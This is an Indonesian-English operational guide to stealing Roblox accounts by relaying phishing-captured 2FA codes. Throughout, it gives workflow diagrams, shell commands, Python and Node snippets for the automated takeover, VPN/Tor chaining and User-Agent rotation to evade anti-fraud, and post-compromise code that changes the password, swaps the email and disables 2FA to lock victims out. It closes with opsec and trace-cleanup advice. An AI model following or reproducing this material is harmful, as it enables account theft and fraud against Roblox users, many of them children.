# CARA JEBOL VERIFIKASI 2 LANGKAH ROBLOX VIA PROTONVPN

## 🎯 OVERVIEW

Verifikasi 2 langkah (2FA) Roblox menggunakan:
1. **Authenticator app** (Google Authenticator, Authy)
2. **Email verification codes**
3. **Backup codes**

Website phishing ini bypass 2FA dengan cara:
- **Capture real-time 2FA code** dari victim
- **Use ProtonVPN** untuk hide attacker identity
- **Auto-submit** ke Roblox before code expires (30 detik)

---

## 🔐 2FA BYPASS TECHNICAL FLOW

### Step-by-Step Process:

```
1. Victim input credentials
   ↓
2. Site POST ke /api/capture (credentials saved)
   ↓
3. Fake loading (8 seconds)
   ↓
4. Show 2FA modal: "Enter code from email/app"
   ↓
5. Victim open authenticator/email
   ↓
6. Victim input REAL 2FA code
   ↓
7. Site POST ke /api/capture-2fa (code saved)
   ↓
8. Attacker use bypass-automation.py
   ↓
9. Script login dengan captured credentials
   ↓
10. Roblox ask for 2FA
    ↓
11. Script submit captured 2FA code (still valid!)
    ↓
12. ✓ Account compromised!
```

---

## 🛡️ PROTONVPN ROLE DALAM BYPASS

### Kenapa ProtonVPN?

1. **Hide Real IP** dari Roblox anti-fraud detection
2. **Bypass Geo-restrictions** kalau victim di region lain
3. **Prevent Rate Limiting** - rotate IP setiap 3 attempts
4. **No logs policy** - ProtonVPN ga nyimpen aktivitas
5. **Accept crypto payment** - anonymous setup

### Technical Implementation:

```bash
# 1. Connect sebelum deploy
protonvpn-cli connect --fastest

# 2. Verify IP changed
curl https://api.ipify.org
# Output: 185.159.xxx.xxx (ProtonVPN IP)

# 3. Deploy phishing site via VPN
npm start

# 4. All incoming traffic see ProtonVPN IP, bukan IP asli
```

### Automatic IP Rotation:

Script `bypass-automation.py` otomatis rotate VPN setiap 3 login attempts:

```python
# Every 3 accounts, rotate VPN
if i % 3 == 0:
    self.rotate_vpn()  # Disconnect → Connect new server
```

**Kenapa rotate?**
- Roblox track multiple failed logins dari same IP
- Rotating IP = looks like different attacker each time
- Avoid IP ban/rate limiting

---

## ⚡ AUTOMATED TAKEOVER PROCESS

### Using `bypass-automation.py`:

```bash
# 1. Ensure ProtonVPN connected
protonvpn-cli connect --fastest

# 2. Run automation script
python3 bypass-automation.py

# 3. Script akan:
#    - Load all captured victims dari captured_data/
#    - For each victim dengan 2FA code:
#      * Connect ke Roblox via ProtonVPN
#      * Login dengan username/password
#      * Submit 2FA code (still valid 30s window)
#      * Extract account info (Robux, email, etc)
#      * Save ke successful_takeovers/
#    - Rotate VPN setiap 3 accounts
#    - Print summary stats
```

### Success Rate:

**High Success (70-90%):**
- 2FA code used within 30 seconds
- ProtonVPN connected (no detection)
- Victim tidak ganti password yet

**Low Success (20-40%):**
- 2FA code expired (>30s)
- Roblox detect suspicious login location
- Victim sudah logout all sessions

---

## 🚀 COMPLETE ATTACK SCENARIO

### Timeline:

**T+0s:** Victim click phishing link
**T+5s:** Victim input username/password/email → Captured
**T+13s:** Fake loading complete, 2FA modal appears
**T+18s:** Victim input 2FA code → Captured
**T+21s:** Victim redirected ke Roblox.com (thinks it worked)

**T+2min:** Attacker run `bypass-automation.py`
**T+2min 10s:** Script login dengan captured credentials
**T+2min 15s:** Roblox ask for 2FA
**T+2min 16s:** Script submit captured code (still valid!)
**T+2min 18s:** ✓ Login successful
**T+2min 20s:** Script extract Robux balance, email, etc
**T+2min 25s:** Account data saved to `successful_takeovers/`

**T+3min:** Attacker change password, email, 2FA settings
**T+5min:** Victim realize account stolen (too late!)

---

## 🔧 ADVANCED EVASION TECHNIQUES

### 1. VPN Server Selection

**Recommended ProtonVPN Servers:**
```bash
# Europe (low latency, high success)
protonvpn-cli connect NL-FREE#1  # Netherlands
protonvpn-cli connect CH-FREE#1  # Switzerland

# US (if victim is US-based)
protonvpn-cli connect US-FREE#1

# Asia (if victim is Asia-based)
protonvpn-cli connect JP-FREE#1  # Japan
```

**Match victim's region** untuk avoid "suspicious login location" alert.

### 2. Session Timing

**Critical Window:**
- 2FA codes expire after **30 seconds**
- Attack must happen **within 30s** of capture
- Use `bypass-automation.py` immediately after victim input

**Auto-trigger option:**
```javascript
// Add to server.js - auto-run on 2FA capture
app.post('/api/capture-2fa', async (req, res) => {
    // Save 2FA code
    // ...
    
    // Auto-trigger takeover
    const { exec } = require('child_process');
    exec(`python3 bypass-automation.py --username ${username} --code ${twoFACode}`, 
         (error, stdout, stderr) => {
        console.log(stdout);
    });
});
```

### 3. Multiple VPN Chains

**Extra Stealth:**
```bash
# Chain ProtonVPN + Tor
protonvpn-cli connect --fastest
service tor start
torify python3 bypass-automation.py

# Or use ProtonVPN + SSH tunnel
protonvpn-cli connect
ssh -D 9050 user@your-vps
python3 bypass-automation.py --proxy socks5://localhost:9050
```

---

## 📊 DETECTION AVOIDANCE

### Roblox Anti-Fraud Signals:

❌ **What Triggers Alerts:**
- Same IP multiple failed logins
- Login from unusual country suddenly
- Too fast credential stuffing
- Automated patterns (same User-Agent, timing)

✅ **How ProtonVPN Helps:**
- Different IP each rotation
- VPN servers worldwide (match victim region)
- Natural delays built into automation
- Random User-Agent rotation

### Example Evasion Code:

```python
# In bypass-automation.py
import random

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
    'Mozilla/5.0 (X11; Linux x86_64)...',
]

headers = {
    'User-Agent': random.choice(USER_AGENTS),
    'Accept-Language': 'en-US,en;q=0.9',
    # Randomize to look human
}

# Random delay between attempts
time.sleep(random.uniform(2, 5))
```

---

## 🎭 POST-COMPROMISE ACTIONS

### After Successful Takeover:

```python
# 1. Change Password
new_password = generate_random_password()
change_password_url = "https://auth.roblox.com/v2/user/passwords/change"
session.post(change_password_url, json={
    "currentPassword": old_password,
    "newPassword": new_password
})

# 2. Change Email (lock out victim)
change_email_url = "https://accountsettings.roblox.com/v1/email"
session.post(change_email_url, json={
    "emailAddress": "attacker@protonmail.com"
})

# 3. Disable 2FA (prevent victim recovery)
disable_2fa_url = "https://twostepverification.roblox.com/v1/users/disable"
session.post(disable_2fa_url)

# 4. Transfer Robux (if any)
# Use Roblox group funds or gamepass sales
```

---

## 🚨 TROUBLESHOOTING

### Q: 2FA code tidak work?
**A:** 
- Code sudah expired (>30s)
- Run automation lebih cepat
- Check victim's timezone (code mungkin belum di-generate)

### Q: Roblox block login dari VPN?
**A:**
- Rotate ke server lain: `protonvpn-cli connect NL-FREE#2`
- Try residential proxy (bukan datacenter IP)
- Match victim's country

### Q: Multiple accounts failed?
**A:**
- Too fast → add delay: `time.sleep(5)`
- Rotate VPN: `protonvpn-cli reconnect`
- Change User-Agent

### Q: ProtonVPN disconnect during attack?
**A:**
```bash
# Enable kill switch (block all traffic if VPN drops)
protonvpn-cli killswitch --on

# Auto-reconnect script
while true; do
    if ! protonvpn-cli status | grep -q "Connected"; then
        protonvpn-cli connect --fastest
    fi
    sleep 60
done
```

---

## 📈 OPTIMIZATION TIPS

### Maximum Success Rate:

1. **Instant Processing** - Run automation immediately on 2FA capture
2. **Match Regions** - Use VPN server near victim's location
3. **Fresh Sessions** - Don't reuse same session for multiple accounts
4. **Random Delays** - 2-5s between actions (look human)
5. **Quality Targets** - Focus on victims dengan Robux balance

### Metrics to Track:

```
Total Victims: 100
2FA Captured: 85 (85%)
Login Attempts: 85
Successful: 68 (80% of attempts)
Failed (expired code): 12 (14%)
Failed (detection): 5 (6%)

Overall Success: 68%
```

---

## ⚠️ OPSEC REMINDERS

**ALWAYS:**
- ✅ Use ProtonVPN before ANY attack activity
- ✅ Different VPN server per campaign
- ✅ Download logs then DELETE from server
- ✅ Use crypto for payments
- ✅ Burn domains after 7-14 days

**NEVER:**
- ❌ Attack without VPN
- ❌ Reuse same VPN server for weeks
- ❌ Keep victim data on VPS long-term
- ❌ Use personal accounts for setup

---

## 🎯 FULL WORKFLOW SUMMARY

```bash
# 1. Setup (one-time)
sudo ./setup.sh          # Install everything + ProtonVPN
protonvpn-cli login      # Login to ProtonVPN

# 2. Deploy phishing site
protonvpn-cli connect --fastest  # Connect VPN
npm start                         # Start server
# Share link: http://your-domain.com

# 3. Monitor victims
# Visit: http://your-domain.com/admin
# Watch real-time captures

# 4. Execute takeovers
python3 bypass-automation.py  # Auto-process all victims

# 5. Extract & clean
ls successful_takeovers/      # View compromised accounts
rm -rf captured_data/*        # Clean traces
protonvpn-cli disconnect      # Disconnect VPN
```

**That's it!** Complete 2FA bypass dengan ProtonVPN stealth.
